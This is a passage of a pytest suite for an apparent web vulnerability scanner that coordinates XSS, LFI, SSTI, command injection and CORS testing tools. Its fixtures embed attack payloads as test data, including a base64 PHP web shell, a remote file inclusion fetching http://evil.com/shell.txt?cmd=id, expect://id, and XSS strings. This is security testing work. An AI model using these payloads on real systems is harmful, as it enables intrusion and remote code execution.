from __future__ import annotations

import base64
import json
from subprocess import DEVNULL
from types import SimpleNamespace
from unittest.mock import Mock
from urllib.parse import parse_qs, urlparse

import pytest

import modules.tools.advanced_payload_coordinator as apc

# -------------------------
# Small helpers
# -------------------------

class FakeCompleted:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


class FakeResponse:
    def __init__(self, text="", status_code=200, headers=None):
        self.text = text
        self.status_code = status_code
        self.headers = headers or {}


def b64s(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def test_advanced_payload_reuses_cache_for_equivalent_headers_and_writes_output(monkeypatch, tmp_path):
    calls = {"setup": 0}

    def setup():
        calls["setup"] += 1
        return {"tools": [], "failed": []}

    monkeypatch.setattr(apc, "setup_payload_tools", setup)
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *args, **kwargs: ["q"])
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda results: {})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: [])

    first = apc.advanced_payload_coordinator(
        "example.test/path",
        test_type="param_discovery",
        headers={"X-First": "1", "X-Second": "2"},
    )
    output_file = tmp_path / "cached.json"
    second = apc.advanced_payload_coordinator(
        "https://example.test/path",
        test_type="param_discovery",
        headers={"X-Second": "2", "X-First": "1"},
        output_file=str(output_file),
    )

    assert first == second
    assert calls["setup"] == 1
    assert output_file.read_text(encoding="utf-8") == second


def test_advanced_payload_cache_key_includes_request_inputs(monkeypatch):
    calls = {"setup": 0}

    def setup():
        calls["setup"] += 1
        return {"tools": [], "failed": []}

    monkeypatch.setattr(apc, "setup_payload_tools", setup)
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *args, **kwargs: [])
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda results: {})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: [])

    apc.advanced_payload_coordinator("https://example.test", test_type="param_discovery", parameters="q")
    apc.advanced_payload_coordinator("https://example.test", test_type="param_discovery", parameters="page")

    assert calls["setup"] == 2


def test_advanced_payload_normalizes_unknown_test_type_to_comprehensive(monkeypatch):
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": [], "failed": []})
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_coordinate_xss_testing", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_coordinate_injection_testing", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda _results: {})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda *_args: [])
    result = json.loads(apc.advanced_payload_coordinator("example.test", test_type="unknown"))
    assert result["test_type"] == "comprehensive"


def test_advanced_payload_normalizes_supported_aliases(monkeypatch):
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": [], "failed": []})
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_coordinate_xss_testing", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_coordinate_injection_testing", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda _results: {})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda *_args: [])
    for alias, canonical in (("local_file", "lfi"), ("template", "ssti")):
        result = json.loads(apc.advanced_payload_coordinator("example.test", test_type=alias))
        assert result["test_type"] == canonical

    for alias in ("cmd", "command"):
        result = json.loads(apc.advanced_payload_coordinator("example.test", test_type=alias))
        assert result["test_type"] == "command_injection"
    result = json.loads(apc.advanced_payload_coordinator("example.test", test_type="ldap"))
    assert result["test_type"] == "ldap_injection"
    for alias, canonical in (("local_file_inclusion", "lfi"), ("template_injection", "ssti"), ("ldap_injection", "ldap_injection")):
        result = json.loads(apc.advanced_payload_coordinator("example.test", test_type=alias))
        assert result["test_type"] == canonical


def test_advanced_payload_retries_xss_with_post_and_keeps_successful_results(monkeypatch):
    methods = []
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": ["dalfox"], "failed": []})
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *_args, **_kwargs: ["query"])

    def xss(request_config, *_args, **_kwargs):
        methods.append(request_config.http_method)
        return [] if request_config.http_method == "GET" else [{"vulnerable": True, "parameter": "query"}]

    monkeypatch.setattr(apc, "_coordinate_xss_testing", xss)
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda _results: {"attack_vectors": []})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda *_args: ["verify"])

    result = json.loads(apc.advanced_payload_coordinator("https://xss-retry.example", test_type="xss"))

    assert methods == ["GET", "POST"]
    assert result["http_method"] == "POST"
    assert result["vulnerabilities"] == [{"vulnerable": True, "parameter": "query"}]
    assert result["recommendations"] == ["verify"]


def test_advanced_payload_retries_injection_then_restores_get_when_post_has_no_finding(monkeypatch):
    methods = []
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": [], "failed": ["commix"]})
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda *_args, **_kwargs: ["path"])

    def injection(request_config, *_args, **_kwargs):
        methods.append(request_config.http_method)
        return [{"vulnerable": False, "parameter": "path"}]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", injection)
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda _results: {"attack_vectors": []})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda *_args: [])

    result = json.loads(apc.advanced_payload_coordinator("https://lfi-retry.example", test_type="lfi"))

    assert methods == ["GET", "POST"]
    assert result["http_method"] == "GET"
    assert result["payload_results"] == [{"vulnerable": False, "parameter": "path"}]


# -------------------------
# _b64
# -------------------------

def test_b64_none_is_empty_string():
    assert apc._b64(None) == ""


def test_b64_bytes_roundtrip():
    raw = b"\xff\x00abc"
    out = apc._b64(raw)
    assert base64.b64decode(out) == raw


def test_b64_str_roundtrip():
    raw = "hello✓"
    out = apc._b64(raw)
    assert base64.b64decode(out).decode("utf-8") == raw


# -------------------------
# _add_or_replace_query_param
# -------------------------

def test_add_or_replace_query_param_sets_and_overwrites():
    url = "http://example.test/page?x=1&y=2"
    u2 = apc._add_or_replace_query_param(url, "y", "abc")
    parsed = urlparse(u2)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    assert qs["x"] == ["1"]
    assert qs["y"] == ["abc"]


def test_add_or_replace_query_param_preserves_fragment():
    url = "http://example.test/page#frag"
    u2 = apc._add_or_replace_query_param(url, "q", "1")
    assert urlparse(u2).fragment == "frag"


# -------------------------
# _requests_get_text / _requests_head_raw_headers
# -------------------------

def test_requests_get_text_happy_path(monkeypatch):
    def fake_request(method, url, **kwargs):
        assert method == "GET"
        assert url == "http://example.test/page"
        assert kwargs["params"] == {"a": "1"}
        return SimpleNamespace(text="OK")

    monkeypatch.setattr(apc.requests, "request", fake_request)
    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    assert apc._requests_get_text("http://example.test/page", {"a": "1"}, rc) == "OK"


def test_requests_get_text_returns_none_on_exception(monkeypatch):
    def fake_request(*args, **kwargs):
        raise RuntimeError("boom")

    monkeypatch.setattr(apc.requests, "request", fake_request)
    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    assert apc._requests_get_text("http://example.test/page", {"a": "1"}, rc) is None


def test_requests_head_raw_headers_merges_headers(monkeypatch):
    def fake_head(url, headers, **kwargs):
        assert url == "http://example.test/page"
        # request_config.headers plus per-call headers
        assert headers["X-Base"] == "1"
        assert headers["Origin"] == "https://evil.com"
        return SimpleNamespace(headers={"A": "b", "C": "d"})

    monkeypatch.setattr(apc.requests, "head", fake_head)
    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET", headers={"X-Base": "1"})
    out = apc._requests_head_raw_headers("http://example.test/page", {"Origin": "https://evil.com"}, rc)
    assert "A: b" in out
    assert "C: d" in out


def test_request_helpers_cover_post_body_and_head_failures(monkeypatch):
    captured = {}

    def fake_request(method, url, **kwargs):
        captured.update(method=method, params=kwargs["params"], data=kwargs["data"])
        return SimpleNamespace(text="POST response")

    monkeypatch.setattr(apc.requests, "request", fake_request)
    config = apc.RequestConfig("https://example.test", http_method="POST")
    assert apc._requests_get_text("https://example.test", {"a": "1"}, config) == "POST response"
    assert captured == {"method": "POST", "params": None, "data": {"a": "1"}}

    monkeypatch.setattr(apc.requests, "head", Mock(side_effect=RuntimeError("offline")))
    assert apc._requests_head_raw_headers("https://example.test", {}, config) is None
    assert apc._coerce_str(b"bytes") == "bytes"
    assert apc._coerce_str(123) == "123"
    assert apc._coerce_str(None) == ""


def test_request_config_method_normalization_and_binary_coercion():
    assert apc.RequestConfig("https://example.test", http_method="put").inject_in_body() is True
    assert apc.RequestConfig("https://example.test", http_method="get").inject_in_body() is False
    assert apc._b64(None) == ""
    assert apc._b64(b"bytes") == b64s("bytes")


# -------------------------
# _parse_sstimap_output
# -------------------------

def test_parse_sstimap_output_body_param_and_capabilities():
    stdout = """
[+] SSTImap identified the following injection point:

  Body parameter: name
  Engine: Eval_generic
  Injection: {{*}}
  Context: text
  OS: undetected
  Technique: rendered
  Capabilities:

    Shell command execution: no
    Bind and reverse shell: no
    File write: no
    File read: no
    Code evaluation: no

[+] Rerun SSTImap providing one of the following options:
"""
    findings = apc._parse_sstimap_output(stdout)
    assert len(findings) == 1
    f = findings[0]
    assert f["vulnerable"] is True
    assert f["injection_type"] == "SSTI"
    assert f["parameter"] == "name"
    assert f["param_location"] == "body"
    assert f["payload"] == "{{*}}"
    assert f["engine"] == "Eval_generic"
    assert f["context"] == "text"
    assert f["os"] == "undetected"
    assert f["technique"] == "rendered"
    assert f["capabilities"]["Shell command execution"] == "no"


def test_parse_sstimap_output_query_param():
    stdout = """
[+] SSTImap identified the following injection point:

  GET parameter: q
  Engine: Jinja2
  Injection: {{7*7}}
  Context: text
  OS: undetected
  Technique: rendered

[+] Rerun SSTImap providing one of the following options:
"""
    findings = apc._parse_sstimap_output(stdout)
    assert len(findings) == 1
    assert findings[0]["parameter"] == "q"
    assert findings[0]["param_location"] == "query"
    assert findings[0]["payload"] == "{{7*7}}"


def test_parse_sstimap_output_no_marker_returns_empty():
    assert apc._parse_sstimap_output("nothing here") == []



# -------------------------
# _parse_lfimap_output
# -------------------------

def test_parse_lfimap_output_parses_multiple_successful_attacks():
    stdout = """
[*] Starting Data URI LFI Attack...
[*] Testing Data URI payload: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
[+] Data URI LFI successful! Injected code appears to be processed.
--
[*] Starting PHP Expect Wrapper LFI Attack...
[*] Testing initial expect:// payload: expect://id
[+] PHP Expect Wrapper LFI likely successful! Initial command 'id' output detected.
--
[*] Testing GLOB wrapper payloads for directory listing.
[*] Testing GLOB wrapper payload: glob:///var/www/*
[+] GLOB Wrapper LFI likely successful! Directory content detected with payload: glob:///var/www/*
--
[*] Testing php://input payload: php://input
[*] Injecting POST data: <?php system($_GET['cmd']); ?>
[+] php://input LFI successful! Injected code appears to be processed.
"""
    findings = apc._parse_lfimap_output("page", "GET", stdout)
    assert len(findings) == 4

    data_uri = findings[0]
    assert data_uri["vulnerable"] is True
    assert data_uri["injection_type"] == "LFI"
    assert data_uri["payload_type"] == "LFI (Data URI LFI)"
    assert data_uri["parameter"] == "page"
    assert data_uri["param_location"] == "query"
    assert data_uri["payload"] == "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    assert data_uri["attack_type"] == "Data URI LFI"
    assert data_uri["payload_source"] == "Data URI"
    assert data_uri["injected_data"] is None
    assert data_uri["tool"] == "lfimap"
    assert "Data URI LFI successful!" in data_uri["evidence"]

    expect_wrapper = findings[1]
    assert expect_wrapper["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
    assert expect_wrapper["payload"] == "expect://id"
    assert expect_wrapper["attack_type"] == "PHP Expect Wrapper LFI"
    assert expect_wrapper["payload_source"] == "initial expect://"
    assert "Initial command 'id' output detected." in expect_wrapper["evidence"]

    glob_wrapper = findings[2]
    assert glob_wrapper["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
    assert glob_wrapper["payload"] == "glob:///var/www/*"
    assert glob_wrapper["payload_source"] == "GLOB wrapper"
    assert "Directory content detected" in glob_wrapper["evidence"]

    php_input = findings[3]
    assert php_input["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
    assert php_input["payload"] == "php://input"
    assert php_input["payload_source"] == "php://input"
    assert php_input["injected_data"] == "<?php system($_GET['cmd']); ?>"
    assert "Injected data: <?php system($_GET['cmd']); ?>" in php_input["evidence"]


def test_parse_lfimap_output_ignores_alerts_and_flushes_unknown_attack():
    stdout = """
[!] no attack context
[+] orphan successful! ignored
[*] Starting Custom Attack...
[+] Custom successful! evidence
"""
    findings = apc._parse_lfimap_output("file", "POST", stdout)
    assert findings == [
        {
            "vulnerable": True,
            "injection_type": "LFI",
            "payload_type": "LFI (Custom)",
            "parameter": "file",
            "param_location": "body",
            "payload": None,
            "attack_type": "Custom",
            "payload_source": None,
            "injected_data": None,
            "evidence": "Attack: Custom; [+] Custom successful! evidence",
            "tool": "lfimap",
        }
    ]
def test_parse_lfimap_output_rfi():
    stdout = """
[*] Starting RFI Attack...
[*] Testing rfi with command: http://evil.com/shell.txt?cmd=id
[+] RFI successful! Injected code appears to be processed.
"""
    findings = apc._parse_lfimap_output("page", "GET", stdout)
    assert len(findings) == 1
    f = findings[0]
    assert f["vulnerable"] is True
    assert f["injection_type"] == "LFI"
    assert f["payload_type"] == "LFI (RFI)"
    assert f["parameter"] == "page"
    assert f["payload"] == "http://evil.com/shell.txt?cmd=id"
    assert f["attack_type"] == "RFI"
    assert f["payload_source"] == "rfi"
    assert "RFI successful!" in f["evidence"]


def test_parse_lfimap_output_no_success_marker_returns_empty():
    stdout = """
[*] Starting Data URI LFI Attack...
[*] Testing Data URI payload: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
[-] Payload failed.
"""
    assert apc._parse_lfimap_output("page", "GET", stdout) == []

def test_setup_payload_tools_marks_failed_on_install_nonzero(monkeypatch):
    # which fails for all tools, pip fails for one tool
    calls = []

    def fake_run(cmd, capture_output=False, text=False, timeout=None, env=None):
        calls.append(cmd)
        if cmd[:2] == ["which", cmd[2] if len(cmd) > 2 else ""]:
            return FakeCompleted(returncode=1)
        if cmd[:2] == ["which", "dalfox"]:
            return FakeCompleted(returncode=1)
        if cmd[:2] == ["go", "install"]:
            return FakeCompleted(returncode=1, stderr="nope")
        if cmd[:2] == ["pip3", "install"]:
            # fail the first pip install, succeed others if needed
            pkg = cmd[2]
            return FakeCompleted(returncode=1 if pkg == "arjun" else 0)
        return FakeCompleted(returncode=0)

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    st = apc.setup_payload_tools()
    assert st["failed"], "expected at least one failed tool"


# -------------------------
# _advanced_parameter_discovery
# -------------------------


def test_advanced_parameter_discovery_extracts_from_url_query_even_if_no_tools():
    rc = apc.RequestConfig(target_url="http://example.test/page?x=1&y=2")
    params = apc.advanced_parameter_discovery(rc, tools=[])
    assert "x" in params
    assert "y" in params


def test_advanced_parameter_discovery_adds_provided_params():
    rc = apc.RequestConfig(target_url="http://example.test/page")
    params = apc.advanced_parameter_discovery(rc, provided_params="a, b ,c", tools=[])
    assert set(params) >= {"a", "b", "c"}


def test_advanced_parameter_discovery_reads_arjun_json_and_passes_auth_headers(monkeypatch):
    commands = []

    def run(command, **_kwargs):
        commands.append(command)
        output_path = command[command.index("-oJ") + 1]
        with open(output_path, "w", encoding="utf-8") as output:
            json.dump({"https://example.test": {"params": ["from_arjun", "id"]}}, output)
        return FakeCompleted(returncode=0, stdout="Parameters found: stdout_param")

    monkeypatch.setattr(apc.subprocess, "run", run)
    config = apc.RequestConfig(
        "https://example.test/path",
        headers={"X-Test": "one"},
        cookies={"sid": "two"},
    )

    params = apc.advanced_parameter_discovery(config, tools=["arjun"])

    assert {"from_arjun", "id", "stdout_param"}.issubset(params)
    assert "--headers" in commands[0]
    assert "Cookie: sid=two" in commands[0][commands[0].index("--headers") + 1]


def test_advanced_parameter_discovery_common_params_only_if_none_found(monkeypatch):
    # Set up baseline request to succeed and make a status_code difference for one common param.
    seen = []

    def fake_request(method, url, **kwargs):
        seen.append(kwargs.get("params"))
        params = kwargs.get("params") or {}
        if not params:
            return SimpleNamespace(status_code=200, headers={"Content-Length": "100"})
        if "name" in params:
            return SimpleNamespace(status_code=404, headers={"Content-Length": "100"})
        return SimpleNamespace(status_code=200, headers={"Content-Length": "100"})

    monkeypatch.setattr(apc.requests, "request", fake_request)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    params = apc.advanced_parameter_discovery(rc, tools=[])
    assert "name" in params  # discovered via status code delta


def test_advanced_parameter_discovery_detects_response_length_ratio(monkeypatch):
    def fake_request(_method, _url, **kwargs):
        params = kwargs.get("params") or {}
        if not params:
            return SimpleNamespace(status_code=200, headers={"Content-Length": "100"})
        length = "200" if "id" in params else "100"
        return SimpleNamespace(status_code=200, headers={"Content-Length": length})

    monkeypatch.setattr(apc.requests, "request", fake_request)
    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    assert "id" in apc.advanced_parameter_discovery(rc, tools=[])


# -------------------------
# _coordinate_xss_testing
# -------------------------

def test_coordinate_xss_testing_parses_dalfox_json_array(monkeypatch):
    # DalFox returns a JSON array; one vuln event and one non-vuln (or none).
    events = [
        {
            "type": "V",
            "param": "name",
            "inject_type": "inHTML",
            "data": "http://example.test/page?name=PAY",
            "payload": "<img src=x onerror=alert(1)>",
            "message_str": "Triggered",
        },
        {"type": "I", "param": "other"},
    ]

    def fake_run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=None):
        return FakeCompleted(returncode=0, stdout=json.dumps(events))

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_xss_testing(rc, parameters=["name"], tools=["dalfox"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert len(vulns) == 1
    v = vulns[0]
    assert v["parameter"] == "name"
    assert v["url"] == "http://example.test/page"
    assert v["payload"] == "<img src=x onerror=alert(1)>"

def test_coordinate_xss_testing_returns_empty_for_no_parameters():
    rc = apc.RequestConfig(target_url="https://example.test", http_method="GET")
    assert apc._coordinate_xss_testing(rc, parameters=[], tools=None) == []


def test_coordinate_xss_testing_limits_reflection_results_and_reports_uncovered_params(monkeypatch):
    events = [
        {"type": "R", "param": "name", "inject_type": "reflected", "payload": "one"},
        {"type": "R", "param": "name", "inject_type": "reflected", "payload": "two"},
        {"type": "R", "param": "name", "inject_type": "reflected", "payload": "three"},
    ]
    monkeypatch.setattr(apc.subprocess, "run", lambda *args, **kwargs: FakeCompleted(stdout=json.dumps(events)))
    rc = apc.RequestConfig(target_url="https://example.test", http_method="GET")
    results = apc._coordinate_xss_testing(rc, parameters=["name", "other"], tools=["dalfox"])
    assert len([item for item in results if item.get("vulnerable") is False]) == 4
    assert any(item.get("parameter") == "other" and item.get("payload_type") == "XSS tested" for item in results)


def test_coordinate_xss_testing_parses_dalfox_jsonl(monkeypatch):
    # DalFox returns a JSON array; one vuln event and one non-vuln (or none).
    events = [
        {
            "type": "V",
            "param": "name",
            "inject_type": "inHTML",
            "data": "http://example.test/page?name=PAY",
            "payload": "<img src=x onerror=alert(1)>",
            "message_str": "Triggered",
        },
        {"type": "I", "param": "other"},
    ]

    stdout = "[\n" + "\n".join(json.dumps(event) for event in events) + "\n]"

    def fake_run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=None):
        return FakeCompleted(returncode=0, stdout=stdout)

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_xss_testing(rc, parameters=["name"], tools=["dalfox"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert len(vulns) == 1
    v = vulns[0]
    assert v["parameter"] == "name"
    assert v["url"] == "http://example.test/page"
    assert v["payload"] == "<img src=x onerror=alert(1)>"


def test_coordinate_xss_testing_processes_timeout_stdout_and_skips_negative_results(monkeypatch):
    # On subprocess timeout, dalfox stdout should still be parsed.
    # Additionally, when dalfox times out, the implementation intentionally avoids adding
    # negative "XSS tested" rows for remaining params.
    event = {
        "type": "V",
        "param": "name",
        "inject_type": "inHTML",
        "data": "http://example.test/page?name=PAY",
        "payload": "<img src=x onerror=alert(1)>",
        "message_str": "Triggered",
    }

    def fake_run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=None):
        raise apc.subprocess.TimeoutExpired(cmd=cmd, timeout=timeout or 0, output=json.dumps([event]))

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_xss_testing(rc, parameters=["name", "other"], tools=["dalfox"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert len(vulns) == 1
    assert vulns[0]["parameter"] == "name"

    negatives = [r for r in res if r.get("vulnerable") is False and r.get("tool") == "dalfox"]
    assert negatives == [], "On timeout, expected no dalfox negative results to be appended"


# -------------------------
# _test_cors_configurations
# -------------------------

def test_test_cors_configurations_manual_detects_permissive(monkeypatch):
    # Disable corsy by passing tools=[]
    def fake_head_raw_headers(url, headers, request_config, timeout=10):
        # Return allow-origin reflecting the Origin
        origin = headers["Origin"]
        return f"Access-Control-Allow-Origin: {origin}\nVary: Origin"

    monkeypatch.setattr(apc, "_requests_head_raw_headers", fake_head_raw_headers)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._test_cors_configurations(rc, tools=[])
    vulns = [r for r in res if r.get("vulnerable")]
    assert vulns
    assert vulns[0]["issue_type"] == "Permissive CORS"


def test_test_cors_configurations_manual_negative_when_no_headers(monkeypatch):
    def fake_head_raw_headers(url, headers, request_config, timeout=10):
        return "Server: test\n"

    monkeypatch.setattr(apc, "_requests_head_raw_headers", fake_head_raw_headers)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._test_cors_configurations(rc, tools=[])
    assert res and res[0]["vulnerable"] is False


def test_test_cors_configurations_corsy_positive_and_negative(monkeypatch):
    monkeypatch.setattr(
        apc.subprocess,
        "run",
        lambda *args, **kwargs: FakeCompleted(stdout="Severity: HIGH - wildcard origin"),
    )
    rc = apc.RequestConfig(target_url="https://example.test")
    positive = apc._test_cors_configurations(rc, tools=["corsy"])
    assert positive[0]["vulnerable"] is True

    monkeypatch.setattr(
        apc.subprocess,
        "run",
        lambda *args, **kwargs: FakeCompleted(stdout="No issues"),
    )
    negative = apc._test_cors_configurations(rc, tools=["corsy"])
    assert negative[0]["vulnerable"] is False

    monkeypatch.setattr(apc.subprocess, "run", Mock(side_effect=RuntimeError("missing corsy")))
    monkeypatch.setattr(apc, "_requests_head_raw_headers", lambda *args, **kwargs: "Server: test")
    fallback = apc._test_cors_configurations(rc, tools=["corsy"])
    assert fallback[0]["vulnerable"] is False


# -------------------------
# _coordinate_injection_testing (custom + sstimap)
# -------------------------

def test_coordinate_injection_testing_custom_detects_command_indicator(monkeypatch):
    calls = []

    def fake_get_text(url, params, request_config, timeout=10):
        calls.append((url, params))
        return "uid=1000 gid=1000 groups=1000"

    monkeypatch.setattr(apc, "_requests_get_text", fake_get_text)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_injection_testing(rc, parameters=["name"], tools=[], focus_injection_types=None)

    vulns = [r for r in res if r.get("vulnerable")]
    assert vulns
    assert any(v["injection_type"] == "Command Injection" for v in vulns)


def test_coordinate_injection_testing_detects_ssti_and_ldap_indicators(monkeypatch):
    def fake_get_text(_url, params, _request_config, timeout=10):
        payload = next(iter(params.values()))
        if "42*42" in payload:
            return "result=1764"
        if "ldap" in payload.lower() or "*" in payload:
            return "LDAP error: invalid DN"
        return "ok"

    monkeypatch.setattr(apc, "_requests_get_text", fake_get_text)
    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    ssti = apc._coordinate_injection_testing(rc, ["name"], tools=[], focus_injection_types={"SSTI"})
    ldap = apc._coordinate_injection_testing(rc, ["name"], tools=[], focus_injection_types={"LDAP Injection"})
    assert any(item["injection_type"] == "SSTI" for item in ssti if item.get("vulnerable"))
    assert any(item["injection_type"] == "LDAP Injection" for item in ldap if item.get("vulnerable"))


def test_coordinate_injection_testing_commix_parses_timeout_stdout(monkeypatch):
    # Command injection should be detected via commix tool output, even when the process times out.
    commix_stdout = """
[+] Testing if GET parameter 'name' is vulnerable
[+] Parameter 'name' is vulnerable
"""

    def fake_run(cmd, capture_output=True, text=True, input=None, timeout=300):
        # Ensure we are invoking commix
        assert cmd and cmd[0] == "commix"
        raise apc.subprocess.TimeoutExpired(cmd=cmd, timeout=timeout, output=commix_stdout)

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_injection_testing(rc, parameters=["name"], tools=["commix"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert vulns, "Expected a commix-derived command injection finding"
    v = vulns[0]
    assert v["tool"] == "commix"
    assert v["injection_type"] == "Command Injection"
    assert v["parameter"] == "name"
    assert v.get("method") == "GET"


def test_coordinate_injection_testing_sstimap_parses_and_discards_param(monkeypatch):
    # Ensure sstimap tool path triggers and parser returns a finding,
    # and that param is removed from parameters_under_test.
    sstimap_stdout = """
[+] SSTImap identified the following injection point:

  Body parameter: name
  Engine: Eval_generic
  Injection: {{7*7}}
  Context: text
  OS: undetected
  Technique: rendered

[+] Rerun SSTImap providing one of the following options:
"""

    def fake_run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=300):
        return FakeCompleted(returncode=0, stdout=sstimap_stdout)

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_injection_testing(rc, parameters=["name"], tools=["sstimap"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert vulns
    assert vulns[0]["tool"] == "sstimap"
    assert vulns[0]["parameter"] == "name"
    assert "url" in vulns[0]
    assert all(v.get("tool") != "commix" for v in res)


# -------------------------
# lfimap integration/unit test for timeout stdout
# -------------------------

def test_coordinate_injection_testing_lfimap_parses_timeout_stdout(monkeypatch):
    lfimap_stdout = """
[*] Starting Data URI LFI Attack...
[*] Testing Data URI payload:
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
[+] Data URI LFI successful! Injected code appears to be processed.
"""

    def fake_run(cmd, bufsize=4096, capture_output=True, text=True, input=None, timeout=300):
        assert cmd and cmd[0] == "lfimap"
        raise apc.subprocess.TimeoutExpired(cmd=cmd, timeout=timeout, output=lfimap_stdout)

    monkeypatch.setattr(apc.subprocess, "run", fake_run)

    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
    res = apc._coordinate_injection_testing(rc, parameters=["page"], tools=["lfimap"])

    vulns = [r for r in res if r.get("vulnerable")]
    assert vulns, "Expected an lfimap-derived LFI finding"
    v = vulns[0]
    assert v["tool"] == "lfimap"
    assert v["injection_type"] == "LFI"
    assert v["parameter"] == "page"
    assert v.get("method") == "GET"
    assert v["payload"] == "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"


# -------------------------
# _analyze_payload_intelligence
# -------------------------

def test_analyze_payload_intelligence_counts_and_dedupes():
    payload_results = [
        {"vulnerable": True, "payload_type": "Advanced XSS (inHTML)", "payload": "<svg/onload=alert(1)>"},
        {"vulnerable": True, "injection_type": "Command Injection", "payload": "; whoami"},
        {"vulnerable": False, "issue_type": "CORS Configuration"},
        {"vulnerable": True, "issue_type": "Permissive CORS"},
    ]
    intel = apc._analyze_payload_intelligence(payload_results)
    assert "Advanced XSS" in str(intel["severity_distribution"])
    assert "xss" in intel["attack_vectors"]
    assert "cmd_injection" in intel["attack_vectors"]
    assert "cors" in intel["attack_vectors"]
    # Deduped lists
    assert len(intel["attack_vectors"]) == len(set(intel["attack_vectors"]))


# -------------------------
# _generate_payload_recommendations
# -------------------------

def test_generate_payload_recommendations_when_no_vulns():
    results = {"payload_results": [], "intelligence": {"severity_distribution": {}, "attack_vectors": [], "bypass_techniques": [], "exploitation_chains": []}}
    recs = apc._generate_payload_recommendations("comprehensive", results)
    assert recs
    assert "rerun_with_auth_if_possible" in recs[0]


def test_generate_payload_recommendations_when_high_severity_present():
    results = {
        "payload_results": [{"vulnerable": True, "payload_type": "Advanced XSS (inHTML)"}],
        "intelligence": {"severity_distribution": {"Advanced XSS (inHTML)": 1}, "attack_vectors": ["xss"], "bypass_techniques": [], "exploitation_chains": []},
    }
    recs = apc._generate_payload_recommendations("comprehensive", results)
    assert any('prioritize_high_severity' in r for r in recs)
    assert any('classify_xss_type_reflected_stored_dom' in r.lower() for r in recs)


def test_advanced_payload_coordinator_sql_test_type_raises_value_error():
    import pytest
    with pytest.raises(ValueError, match="SQLi is not supported"):
        apc.advanced_payload_coordinator("http://example.com", test_type="sql")
    with pytest.raises(ValueError, match="SQLi is not supported"):
        apc.advanced_payload_coordinator("http://example.com", test_type="sqli")
    with pytest.raises(ValueError, match="SQLi is not supported"):
